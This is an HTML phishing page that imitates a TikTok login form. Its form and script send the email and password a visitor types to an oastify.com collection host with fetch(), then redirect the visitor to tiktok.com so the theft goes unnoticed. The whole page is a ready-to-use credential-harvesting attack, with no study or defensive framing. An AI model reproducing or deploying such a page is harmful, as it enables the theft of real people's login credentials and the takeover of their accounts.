

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f2f2f2;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 3px; /* Changed to 3px */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .login-container h2 {
            margin-top: 0;
            margin-bottom: 20px;
            text-align: center;
        }
        .login-container input[type="text"], 
        .login-container input[type="password"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 3px; /* Changed to 3px */
        }
        .login-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #ed0739;
            border: none;
            border-radius: 3px; /* Changed to 3px */
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container input[type="submit"]:hover {
            background-color: #218838;
        }
        .login-container .forgot-password {
            text-align: center;
            margin-top: 10px;
        }
        .login-container .forgot-password a {
            color: #007bff;
            text-decoration: none;
        }
        .login-container .forgot-password a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Log in</h2>
        <form action="https://5ouewp1rkjc7huqzn8rx3fjvhmndb4gs5.oastify.com/log" method="POST" onsubmit="redirectToTikTok(event)">
            <input type="text" name="email" placeholder="Email or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <div class="forgot-password">
                <a href="#" style="font-weight: 700;font-size: 14px;color: rgba(255, 0, 81, 0.38);">Forgot password?</a><br>
          <br>
            </div>
            <input type="submit" value="Log in">
        </form>
    </div>
    <script>
        function redirectToTikTok(event) {
            event.preventDefault(); // Prevent the form from submitting the default way
            var form = event.target;
            
            // Create a new FormData object to send the form data
            var formData = new FormData(form);

            // Send the data using fetch
            fetch(form.action, {
                method: form.method,
                body: formData
            }).then(() => {
                // Redirect to TikTok after the data is sent
                window.location.href = "https://tiktok.com";
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
